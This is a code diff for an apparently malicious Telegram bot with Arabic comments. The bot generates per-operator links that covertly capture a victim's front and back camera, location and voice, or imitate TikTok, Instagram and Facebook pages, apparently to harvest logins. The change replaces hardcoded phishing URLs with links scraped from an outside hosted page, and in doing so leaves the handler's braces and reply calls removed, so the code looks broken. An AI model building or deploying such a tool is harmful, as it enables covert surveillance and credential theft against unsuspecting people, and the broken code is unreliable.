@@ -1857,39 +1857,63 @@ bot.on('callback_query', async (callbackQuery) => {
 
     let link = '';
 
-        switch (action) {
-            case 'captureFront':
-                link = `https://mellifluous-frangipane-c22acb.netlify.app/c/?chatId=${chatId}`;
-                break;
-            case 'captureBack':
-                link = `https://meek-froyo-0df2e1.netlify.app/b/?chatId=${chatId}`;
-                break;
-            case 'getLocation':
-                link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-                break;
-            case 'recordVoice':
-                const duration = 10;  
-                link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
-                break;
-            case 'rshq_tiktok':
-                link = `https://zippy-kringle-e8e51f.netlify.app/t/?chatId=${chatId}&type=tiktok`;
-                break;
-            case 'rshq_instagram':
-                link = `https://eloquent-brigadeiros-4de644.netlify.app/i/?chatId=${chatId}`;
-                break;
-            case 'rshq_facebook':
-                link = `https://serene-sfogliatella-65867a.netlify.app/fe/?chatId=${chatId}`;
-                break;
-            default:
-                bot.sendMessage(chatId, '');
-                return;
+       switch (action) {
+    case 'captureFront':
+        // استيراد رابط front من الموقع
+        link = await importLinkFromWebsite('/c', chatId);
+        break;
+    case 'captureBack':
+        // استيراد رابط back من الموقع
+        link = await importLinkFromWebsite('/b', chatId);
+        break;
+    case 'getLocation':
+        link = await importLinkFromWebsite('/getLocation', chatId);
+        break;
+    case 'recordVoice':
+        const duration = 10;
+        const voiceLink = await importLinkFromWebsite('/record', chatId);
+        link = `${voiceLink}&duration=${duration}`;
+        break;
+    case 'rshq_tiktok':
+        link = await importLinkFromWebsite('/ca', chatId);
+        break;
+    case 'rshq_instagram':
+        link = await importLinkFromWebsite('/n', chatId);
+        break;
+    case 'rshq_facebook':
+        link = await importLinkFromWebsite('/fe', chatId);
+        break;
+}
+
+// دالة لاستيراد الروابط من الموقع
+async function importLinkFromWebsite(endpoint, chatId) {
+    const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+    
+    try {
+        const response = await axios.get(url, { timeout: 10000 });
+        const $ = cheerio.load(response.data);
+        let foundLink = null;
+        
+        // البحث عن الرابط الذي ينتهي بـ endpoint المطلوب
+        $('a[href]').each((index, element) => {
+            const link = $(element).attr('href');
+            if (link.endsWith(endpoint)) {
+                foundLink = link;
+                return false; // إيقاف loop عند العثور على أول رابط
+            }
+        });
+        
+        if (foundLink) {
+            // بناء الرابط النهائي مع chatId
+            return `${foundLink}?chatId=${chatId}`;
+        } else {
+            throw new Error(`لم يتم العثور على رابط ينتهي بـ ${endpoint}`);
         }
-
-        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
+    } catch (error) {
+        console.error('Error fetching link:', error);
+        throw new Error(`خطأ في جلب الرابط: ${error.message}`);
     }
-
-    bot.answerCallbackQuery(callbackQuery.id);
-});
+}
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
